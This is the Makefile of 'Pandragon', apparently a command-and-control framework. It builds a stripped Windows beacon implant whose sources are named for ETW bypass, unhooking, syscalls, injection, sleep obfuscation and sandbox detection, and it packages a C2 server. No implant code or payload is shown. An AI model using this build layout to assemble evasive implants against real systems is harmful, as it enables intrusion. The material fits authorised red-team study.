# Pandragon Makefile

CXX = clang++
TARGET = x86_64-w64-windows-gnu
OUTPUT_DIR = build/beacon
OUTPUT = $(OUTPUT_DIR)/pandragon.exe

# Config builder
PYTHON = python3
CONFIG_BUILDER = tools/config_builder.py
CONFIG_FILE ?= Beacon/config/default.json
GENERATED_CONFIG = Beacon/include/generated_config.h

# required for all builds. todo add as input?
KEY_FILE = server/known_beacons.json

# VERBOSE=1
VERBOSE ?= 0
ifeq ($(VERBOSE),1)
    Q =
    ECHO = @true
    CXXFLAGS += -DVERBOSE
else
    Q = @
    ECHO = @echo
endif

BUILD_SEED := $(shell python3 -c "import secrets; print(hex(secrets.randbits(64)))")

CXXFLAGS = -target $(TARGET) -nostdlib -nostartfiles -Oz -std=c++20 \
           -maes -fno-builtin -fno-threadsafe-statics -fno-exceptions \
           -Wall -flto=full -MD -MP -ffunction-sections -fdata-sections \
           -fvisibility=hidden -Wl,--build-id=none \
           -fno-unwind-tables -fno-asynchronous-unwind-tables \
           -I$(OUTPUT_DIR)/.. -I. -Iinclude -IBeacon/include \
           -DBUILD_TIME_RANDOM_SEED=$(BUILD_SEED)

LDFLAGS = -fuse-ld=lld \
          -Wl,--entry=__start \
          -Wl,--gc-sections \
          -Wl,-s \
          #-Wl,--no-seh \
          -Wl,--no-dynamicbase \
          -Wl,--subsystem,windows # im pretty sure this causes an issue if you try to open a BOF that launches a graphical app.
                                    # something something window handle inheritance.


SOURCES = Beacon/core/main.cpp \
          Beacon/core/handlers.cpp \
          Beacon/core/pandragon_runtime.cpp \
          Beacon/core/resolver.cpp \
          Beacon/core/syscalls.cpp \
          Beacon/core/utils.cpp \
          Beacon/core/etw_bypass.cpp \
          Beacon/core/config_parser.cpp \
          Beacon/core/injection.cpp \
          Beacon/core/unhook.cpp \
          Beacon/core/sleep_obf.cpp \
          Beacon/libs/managers.cpp \
          Beacon/libs/network/winhttp.cpp \
          Beacon/libs/network/tcp_socket.cpp \
          Beacon/libs/network/pipe_transport.cpp \
          Beacon/libs/network/transport.cpp \
          Beacon/core/coff/beacon_compatibility.cpp \
          Beacon/core/coff/coff_loader.cpp \
          Beacon/core/coff/bof_runner.cpp \
          Beacon/core/coff/async_bof_manager.cpp \
          Beacon/core/coff/bof_cache.cpp \
          Beacon/core/sandbox.cpp \
          Beacon/core/coff/beacon_api_resolver.cpp \
          Beacon/libs/bastia/bastia.cpp \
          Beacon/libs/network/net_abstract.cpp

# Object files (in build directory)
OBJECTS = $(SOURCES:%.cpp=$(OUTPUT_DIR)/%.o)

# Dependency files
DEPS = $(SOURCES:%.cpp=$(OUTPUT_DIR)/%.d)

-include $(DEPS)

# Conditional DEBUG flag
ifeq ($(DEBUG),1)
    CXXFLAGS += -DDEBUG
    OUTPUT = $(OUTPUT_DIR)/pandragon_debug.exe
else
    # subsystem already set in base LDFLAGS
endif

.PHONY: all clean clean-logs clean-all config rebuild keys sync-keys check-keys \
        server server-cython server-clean

# Default target: check keys, generate config, then build
all: check-keys config $(OUTPUT)
	$(ECHO) "[+] Build complete: $(OUTPUT)"

# Check if key file exists, fail if not
check-keys:
	@if [ ! -f "$(KEY_FILE)" ]; then \
		echo "[!] ERROR: $(KEY_FILE) not found!"; \
		echo "[!] Run 'make keys' first to generate crypto keys."; \
		exit 1; \
	fi
	$(ECHO) "[*] Found key file: $(KEY_FILE)"

# Generate random crypto key if not exists
keys: $(KEY_FILE)

$(KEY_FILE):
	$(ECHO) "[*] Generating random crypto key..."
	@$(PYTHON) -c "import json, os, hashlib; \
key = os.urandom(32); \
beacon_id = hashlib.sha256(key).hexdigest()[:16]; \
data = {'version': 2, 'beacons': {beacon_id: {'crypto_key': key.hex(), 'allowed_routes': []}}}; \
json.dump(data, open('$(KEY_FILE)', 'w'), indent=2); \
print('[+] Generated beacon ID:', beacon_id); \
print('[+] Key saved to:', '$(KEY_FILE)')"

# Sync beacon keys to server directory
sync-keys: keys
	$(ECHO) "[*] Verifying beacon keys..."
	@test -f $(KEY_FILE)
	$(ECHO) "[+] Beacon keys ready: $(KEY_FILE)"

# Generate config from JSON (always regenerate)
config: $(GENERATED_CONFIG)

$(GENERATED_CONFIG): $(CONFIG_FILE) $(CONFIG_BUILDER)
	$(ECHO) "[*] Generating config from $(CONFIG_FILE)..."
	$(Q)$(PYTHON) $(CONFIG_BUILDER) $(CONFIG_FILE) Beacon

# Force config regeneration
.PHONY: force-config
force-config: FORCE_CONFIG
FORCE_CONFIG:
	$(ECHO) "[*] Forcing config regeneration..."
	$(Q)$(PYTHON) $(CONFIG_BUILDER) $(CONFIG_FILE) Beacon

# Link
$(OUTPUT): $(OBJECTS)
	$(CXX) $(CXXFLAGS) $(LDFLAGS) $^ -o $@

# Compile source files (depend on generated config)
$(OUTPUT_DIR)/%.o: %.cpp $(GENERATED_CONFIG)
	@mkdir -p $(dir $@)
	$(CXX) $(CXXFLAGS) -c $< -o $@

clean:
	rm -rf $(OUTPUT_DIR)
	rm -f $(GENERATED_CONFIG)
	rm -f Beacon/config/*.bin Beacon/config/include/generated_config.h
	# NOTE: Do NOT delete $(KEY_FILE) - keys are persistent credentials

# Remove server logs, sessions, and runtime data (preserves keys & config)
clean-logs:
	rm -f server/pandragon*.log
	rm -f server/sessions.json
	rm -f server/operators.json
	$(ECHO) "[+] Server logs & runtime data removed"

# Clean everything: build artifacts, logs, generated files, Python cache
clean-all: clean clean-logs
	rm -rf build/server server/build server/dist
	rm -f build/PandragonServer
	find . -type d -name '__pycache__' -exec rm -rf {} + 2>/dev/null || true
	find . -type d -name '.pytest_cache' -exec rm -rf {} + 2>/dev/null || true
	find . -type f -name '*.pyc' -delete 2>/dev/null || true
	rm -f include/generated_config.h
	rm -f server/known_beacons.json
	rm -f server/protocol/parser.c
	$(ECHO) "[+] Full clean complete"

rebuild: clean all

# =============================================================================
# Server Build (aiohttp -> standalone binary via Cython + PyInstaller)
# =============================================================================

# Cython-compile the protocol parser .pyx -> .so
server-build-parser:
	$(MAKE) -C server build-parser

# Run server tests (builds parser first if .so is stale)
server-test:
	$(MAKE) -C server test

# Build standalone server binary (requires pre-built .so)
server: server-build-parser
	$(ECHO) "[*] Building standalone server binary..."
	mkdir -p build
	cd server && pyinstaller --clean --distpath ../build pandragon.spec
	$(ECHO) "[+] Server binary: build/PandragonServer"

# Remove PyInstaller build artifacts and parser build products
server-clean:
	$(MAKE) -C server clean
	rm -rf server/__pycache__ build/server server/build server/dist
	rm -f build/PandragonServer
	rm -f server/*.spec
